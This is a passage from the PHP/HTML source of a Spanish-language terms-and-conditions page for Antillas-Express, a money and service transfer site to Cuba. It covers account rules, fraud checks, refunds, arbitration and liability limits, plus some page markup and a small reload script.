                Estos datos sirven a validar la identidad del utilizador, el c&oacute;digo 
                de acceso, las transacciones, las solicitudes y los pagos en l&iacute;nea.</p>
              <p class="normalText"><span class="normalTextBold"><a name="10"></a>Responsabilidades 
                del miembro<br>
                </span><span class="normalText">Usted no puede tener m&aacute;s 
                de una cuenta como cliente de </span><span class="normalTextBold">Antillas-Express</span><span class="normalText">. 
                Usted es el &uacute;nico responsable de brindar los datos exactos 
                a prop&oacute;sito de su perfil personal, de su situaci&oacute;n 
                de cr&eacute;dito y de la informaci&oacute;n del destinatario 
                o del beneficiario del servicio a Cuba.</span></p>
              <p class="normalText">Nosotros no reembolsaremos los pagos efectuados 
                en l&iacute;nea si usted a cometido un error sobre la identidad 
                del destinatario o beneficiario de un servicio hacia Cuba, como 
                tampoco si usted cometi&oacute; error en el monto final de la 
                transacci&oacute;n.</p>
              <p class="normalText"><span class="normalTextBold">Antillas-Express</span> 
                no le acordar&aacute; un cr&eacute;dito tampoco si el total de 
                la transacci&oacute;n no obtuvo la aprobaci&oacute;n de quien 
                corresponda por su parte. En principio, la decisi&oacute;n pertenece 
                al propietario de la tarjeta de cr&eacute;dito o a aquel o aquella 
                a quien sea autorizado a hacer su uso. Est&eacute; atento!.</p>
              <p class="normalText"><span class="normalTextBold"><a name="11" id="11"></a>Derechos 
                y obligaciones de Antillas-Express<br>
                Antillas-Express</span> se reserva el derecho de acceder a su 
                ficha hist&oacute;rica y verificar sus operaciones frecuentemente 
                a fin de evitar el blanqueo de dinero o fraudes.</p>
              <p class="normalText"><span class="normalTextBold">Antillas-Express</span> 
                se reserva el derecho de cerrar su cuenta, rechazar o anular una 
                transacci&oacute;n que usted haya efectuado cuando atente contra 
                las restricciones o condiciones de utilizaci&oacute;n en cualquier 
                momento si tenemos raz&oacute;n en creer que :</p>
              <blockquote>
                <p class="normalText">a) usted ha brindado informaci&oacute;n 
                  falsa sobre s&iacute; mismo;<br>
                  b) usted ha entregado la clave personal a otra persona;</p>
              </blockquote>
              <p class="normalText">En caso de irregularidades por parte del cliente, 
                <span class="normalTextBold">Antillas-Express</span> se reserva 
                el derecho de multar las condiciones del contrato conforme a la 
                leyes canadienses. El miembro ser&aacute; informado sobre los 
                cambios concernientes a su direcci&oacute;n de correo electr&oacute;nico 
                de su cuenta personal, sin afectar los t&eacute;rminos de transacciones 
                anteriores.</p>
              <p class="normalText"><span class="normalTextBold">Antillas-Express</span> 
                no es responsable por da&ntilde;o que se pretendan atribuibles 
                al uso de su servicio en l&iacute;nea.</p>
              <p class="normalText"><span class="normalTextBold">Antillas-Express</span> 
                no est&aacute; ligado a una p&eacute;rdida financiera de vuestra 
                parte si sucedieran problemas t&eacute;cnicos fuera de nuestro 
                control tales que un virus, un acto de pirater&iacute;a, una acci&oacute;n 
                fraudulenta, un robo, un error de operaci&oacute;n, un acceso 
                prohibido, una l&iacute;nea telef&oacute;nica defectuosa, una 
                computadora en mal funcionamiento, programas inform&aacute;ticos 
                incompatibles o cualquier otra condici&oacute;n del entorno desfavorable 
                o perjudicial.</p>
              <p><span class="normalTextBold">Antillas-Express</span><span class="normalText"> 
                tiene el derecho de exigir al cliente (miembro) una demora de 
                21 d&iacute;as antes de despachar un servicio cuando considere 
                oportuno investir el origen de una transacci&oacute;n realizada 
                sobre nuestro sitio en acuerdo a las normas y pr&aacute;cticas 
                internacionales en la materia.</span></p>
              <p class="normalText"><a name="12"></a><span class="normalTextBold">Reglamento 
                sobre diferendos</span><br>
                Ante el advenimiento de diferendos relacionados a un servicio 
                brindado por Ant<span class="normalTextBold">illas-Express</span>, 
                ambas partes (usted y nosotros) se comprometen a arreglar el desacuerdo 
                ante un proceso de arbitraje. Y la decisi&oacute;n es final y 
                sin apelaci&oacute;n.</p>
              <p class="normalText"><span class="normalTextBold"><a name="13"></a>Da&ntilde;os 
                colaterales<br>
                </span>Nosotros no somos responsables, ni directa ni indirectamente, 
                ni accidentalmente, de da&ntilde;os, p&eacute;rdidas o todo perjuicio 
                reclamado por una tercera parte ante la ley en ocasi&oacute;n 
                y consecutivamente al despacho del servicio por <span class="normalTextBold">Antillas-Express</span>.</p>
            </blockquote>
<?
}
?>
			</td>
		</tr>
	  	<tr> 
	    	<td>
				<?php include("bas_page.inc"); ?>
			</td>
	  	</tr>
<script language='JavaScript1.2'>
	function Rafraichie(){
			window.location.reload();
			 //str = 'termes_conditions.php'; 
			 //open(str,'_self','status=no,toolbar=no,menubar=no,location=no,resizable=no' );
	} // Rafraichie
</script>

	</table>
</body>
</html>